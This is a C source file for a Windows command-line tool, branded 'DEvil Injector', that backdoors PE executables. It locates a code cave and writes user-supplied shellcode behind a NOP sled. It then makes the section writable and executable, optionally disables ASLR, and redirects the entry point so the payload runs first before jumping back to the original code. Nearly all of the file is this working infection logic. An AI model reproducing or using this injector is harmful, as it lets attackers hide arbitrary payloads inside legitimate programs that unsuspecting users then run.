// *
// *PE Miner
// *@copyright      Copyright(c) DEvil. (https://www.instagram.com/justalghamdi AKA https://www.github.com/justalghamdi)
// *@author         justalghamdi
// *
#include "shared.h"
#include "cnslctrl.h"
#include "api.h"
#include "PE.h"

#pragma warning(suppress: 6031)

void banner();
BYTE* hex2bin(const char* );
char* get_hex(char* );
char* get_file_name(char* );
int FindCaveAndInject();
int FindCaveOnly();



int main() {
	if (IsAppAlreadyRun()) {
		HWND hWnd = GetConsoleWindow();
		ShowWindow(hWnd, SW_HIDE);
		MessageBoxA(0x0, "You are already running the tool !", "DEvil Injector", MB_OK);
		return 1;
	}
	EnableVirtualProcessing(); // Init
	
	Title("CODE INJECT | By insta @justalghamdi | v1.0.0");
	banner();
	printf("[%s1%s] Find Cave Only\r\n[%s2%s] Find Cave And Inject ShellC0de\r\ninput: ", BLU, COLOR_RESET, BLU, COLOR_RESET);
	char* ansr = calloc(8, sizeof(char));
	fgets(ansr, BUFSIZ, stdin);
	ansr[strcspn(ansr, "\n")] = '\0';
	if (ansr[0] == 0x32) {
		return FindCaveAndInject();
	}
	else if(ansr[0] == 0x31){
		return FindCaveOnly();
	}
	else {
		clear();
		printf("Unknow Input"); 
	}
	return 1;
	
}

void banner() {
	clear();
	set_color(RED);
	ENABLE_UTF_16();
	wprintf(L"·▄▄▄▄  ▄▄▄ . ▌ ▐·▪  ▄▄▌  \n");
	wprintf(L"██▪ ██ ▀▄.▀·▪█·█▌██ ██•  \n");
	wprintf(L"▐█· ▐█▌▐▀▀▪▄▐█▐█•▐█·██▪  \n");
	wprintf(L"██. ██ ▐█▄▄▌ ███ ▐█▌▐█▌▐▌\n");
	wprintf(L"▀▀▀▀▀•  ▀▀▀ . ▀  ▀▀▀.▀▀▀ \n\n");
	ENABLE_TEXT();
	reset_color();
}

char* get_hex(char* str) {
	char* new_string = (char*)calloc(strlen(str) + 1, sizeof(char));
	int cc = 0;
	int i = 0;
	for (; cc != strlen(str); i++, cc++) {
		if (('0' <= str[cc]) && (str[cc] <= '9'))
			new_string[i] = str[cc];
		else if (('A' <= str[cc]) && (str[cc] <= 'F'))
			new_string[i] = str[cc];
		else if (('a' <= str[cc]) && (str[cc] <= 'f'))
			new_string[i] = str[cc];
		else {
			--i;
			continue;
		}
	}
	return new_string;
}

BYTE* hex2bin(const char* str)
{
	int len = strlen(str);
	BYTE 
		*result = calloc(len + 2, sizeof(BYTE));
	UINT value = 0;

	for (int i = 0; i < len && sscanf(str + i * 2, "%2x", &value) == 1; i++) {
		result[i] = (BYTE)value;
	}
	return result;
}

char* get_file_name(char* path) {
	char* cPath = calloc(strlen(path) + 1, sizeof(char));
	strcpy(cPath,path);
	if (strstr(cPath, "\\") == NULL) {
		return path;
	}
	char _Delimiter[2] = "\\";
	char* split = strtok(cPath, _Delimiter);
	char* exe_name = NULL;
	do {
		split = strtok(NULL, _Delimiter);
		if (split == NULL)
			break;
		exe_name = split;
	} while (split != NULL);
	return exe_name;
}

int FindCaveAndInject() {
	fflush(stdin);
	fflush(stdout);
	banner();
	printf("[%s?%s] Path: ", YEL, COLOR_RESET);
	char* path = calloc(MAX_PATH * 4, sizeof(char));
	fgets(path, BUFSIZ, stdin);
	path[strcspn(path, "\n")] = '\0';


	printf("[%s+%s] Shell: ", YEL, COLOR_RESET);
	BYTE* shell = calloc(1024 * 4, sizeof(BYTE));
	scanf("%s", (char*)shell);
	int ShellLen = strlen(shell);

	int path_len = strlen(path);
	char* new_path = calloc(path_len + strlen("_injected.exe") + 1, sizeof(char));
	strcpy(new_path, path);
	new_path[path_len - 4] = '\0';
	strcat(new_path, "_injected.exe");
	_CreateFile(new_path);

	PE pe = ExeHeaders(path);
	banner();
	if (pe.FILE_HEADER->Machine == NULL) {
		printf("[%s-%s] Can't Read File Run As Admin !", RED, COLOR_RESET);
		DeleteFile(new_path);
		pause();
		return ~1;
	}
	char* exe_name = get_file_name(path);


	printf("[%si%s] Exe Name: %s\n\n", CYN, COLOR_RESET, exe_name);
	printf("[%s@%s] Exe Arch: %s\n", MAG, COLOR_RESET, !pe.x64 ? "x32_PE" : "x64_PE");
	printf("[%si%s] Image Base: 0x%08X\n", CYN, COLOR_RESET, pe.OPTIONAL_HEADER->ImageBase);
	printf("[%si%s] Entry Point: 0x%08X\n\n", CYN, COLOR_RESET, pe.OPTIONAL_HEADER->AddressOfEntryPoint);
	printf("[%s-%s] Number of sections: %hu\n", YEL, COLOR_RESET, pe.NT_HEADERS->FileHeader.NumberOfSections);
	BOOL ASLR = IsASLR(&pe);
	printf("[%s~%s] ASLR: %s\n", MAG, COLOR_RESET, ASLR ? "Enabled" : "Disabled");
	if (ASLR) {
		char a[2];
		printf("[%s?%s] Do you want to disable the ASLR[y/n]", YEL, COLOR_RESET);
		scanf("%s", &a);

		if (tolower((char)a[0]) == 'y') {
			ASLR = EnableASLR(&pe, FALSE);
			printf("[%s~%s] Disabling ASLR - Status %s\n", MAG, COLOR_RESET, ASLR ? "Done" : "Failed");

		}
		else {
			printf("[%s~%s] Disabling ASLR - Status SKIP\n", CYN, COLOR_RESET);
		}
	}

	putc('\n', stdout);


	char* HexShell = get_hex((char*)shell);
	free(shell);
	shell = calloc((strlen(HexShell) / 2) * 4, sizeof(BYTE));
	strcat(shell, (BYTE*)"90909090");
	strcat(shell, HexShell);
	free(HexShell);
	ShellLen = (strlen(shell) / 2) + 30;
	DWORD OrgEnrtyPoint = pe.OPTIONAL_HEADER->AddressOfEntryPoint;
	DWORD ImageBase = pe.OPTIONAL_HEADER->ImageBase;
	printf("[%s>+%s] Min Shell Size %d\r\n", MAG, COLOR_RESET, ShellLen);
	printf("[%s>?%s] Searching for code cave...\r\n", YEL, COLOR_RESET);

	CAVE cave = FindCave(&pe, ShellLen);
	if (cave.CaveSectionName == NULL) {
		printf("[%s!!%s] No Cave Found On PE .\n", RED, COLOR_RESET);
		DeleteFile(new_path);
		pause();
		return 1;
	}


	printf("[%s->%s] Found Cave: \n", CYN, COLOR_RESET);
	printf("                \tSection Name:                     \t%s\r\n", cave.CaveSectionName);
	printf("                \tSize:                             \t%d\r\n", cave.Size);
	printf("                \tVirtualAddress:                   \t0x%08X\r\n", cave.VirtualAddress);
	printf("                \tRawData                           \t0x%08X\r\n", cave.PointerToRawData);
	printf("                \tPermissions / Characteristics:    \t0x%08X\r\n\r\n", cave.Characteristics);



	cave.Characteristics = IMAGE_SCN_MEM_WRITE | IMAGE_SCN_CNT_CODE | IMAGE_SCN_CNT_UNINITIALIZED_DATA | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ;
	printf("                \tNew Permissions / Characteristics \t0x%08X\r\n", cave.Characteristics);

	cave.VirtualAddress = cave.ImageBase + cave.VirtualAddress + cave.Postion - cave.Size - 1;
	cave.PointerToRawData = cave.PointerToRawData + cave.Postion - cave.Size - 1;
	DWORD NewEntryPoint = cave.VirtualAddress - ImageBase;
	DWORD NewEntryPointSize = 0;
	if (!(NewEntryPoint % 0x04))
		pe.OPTIONAL_HEADER->AddressOfEntryPoint = NewEntryPoint;
	else {
		NewEntryPointSize = (0x04 - (NewEntryPoint % 0x04));
		NewEntryPoint = (4 - (NewEntryPoint % 4)) + NewEntryPoint;
		pe.OPTIONAL_HEADER->AddressOfEntryPoint = NewEntryPoint;
	}
	printf("                \tNew EnrtyPoint:                   \t0x%08X\r\n", pe.OPTIONAL_HEADER->AddressOfEntryPoint);

	char bufferJmpBack[64];
	DWORD EntryPointOffest = (OrgEnrtyPoint + ImageBase);
	DWORD LittleEndianEntryPointOffest = 0;

	//Method From: https://embetronicx.com/tutorials/p_language/c/little-endian-and-big-endian/
	LittleEndianEntryPointOffest |= ((0xff & EntryPointOffest) << 24);
	LittleEndianEntryPointOffest |= (((0xff << 8) & EntryPointOffest) << 8);
	LittleEndianEntryPointOffest |= (((0xff << 16) & EntryPointOffest) >> 8);
	LittleEndianEntryPointOffest |= (((0xff << 24) & EntryPointOffest) >> 24);

	printf("[%s*%s] mov eax, %08X\r\n", YEL, COLOR_RESET, LittleEndianEntryPointOffest);
	printf("[%s*%s] jmp eax\r\n", YEL, COLOR_RESET);

	sprintf(&bufferJmpBack, "%08X", LittleEndianEntryPointOffest);

	if (!pe.x64) {
		strcat(shell, (BYTE*)"B8");
	}
	else {
		strcat(shell, (BYTE*)"48B8");
	}
	strcat(shell, bufferJmpBack);
	strcat(shell, (BYTE*)"FFD0");

	WriteToSection(&pe, cave.PointerToRawData, hex2bin(shell), (strlen(shell) / 2));
	ChangeSectionCharacteristics(cave.CaveSectionName, cave.Characteristics, &pe);
	pe.PATH = new_path;
	printf("\r\n[%s+%s] Saving New File ...\r\n", YEL, COLOR_RESET, new_path);
	WriteExe(&pe);

	free(shell);
	free(pe.RawBinaryFile);
	printf("[%s+%s] Done New File: %s\r\n", GRN, COLOR_RESET, new_path);
	free(new_path);
	free(path);
	pause();
	return 0;
}

int FindCaveOnly() {
	fflush(stdin);
	fflush(stdout);
	banner();
	printf("[%s?%s] Path: ", YEL, COLOR_RESET);
	char* path = calloc(MAX_PATH * 4, sizeof(char));
	fgets(path, BUFSIZ, stdin);
	path[strcspn(path, "\n")] = '\0';
	PE pe = ExeHeaders(path); 
	printf("[%s+%s] MinSize: ",YEL,COLOR_RESET);
	int MinSize = -1;
	scanf("%d", &MinSize);
	CAVE cave = FindCave(&pe, MinSize);
	if (cave.CaveSectionName == NULL) {
		printf("[%s!!%s] No Cave Found On PE .\n", RED, COLOR_RESET);
		pause();
		return 1;
	}
	banner();
	printf("[%s->%s] Found Cave: \n", CYN, COLOR_RESET);
	printf("                \tSection Name:                     \t%s\r\n", cave.CaveSectionName);
	printf("                \tSize:                             \t%d\r\n", cave.Size);
	printf("                \tVirtualAddress:                   \t0x%08X\r\n", cave.VirtualAddress);
	printf("                \tRawData                           \t0x%08X\r\n", cave.PointerToRawData);
	printf("                \tPermissions / Characteristics:    \t0x%08X\r\n", cave.Characteristics);
	printf("                \tMin Size:                         \t0x%08X\r\n\r\n", cave.MinSize);

	pause();
	return 0;
}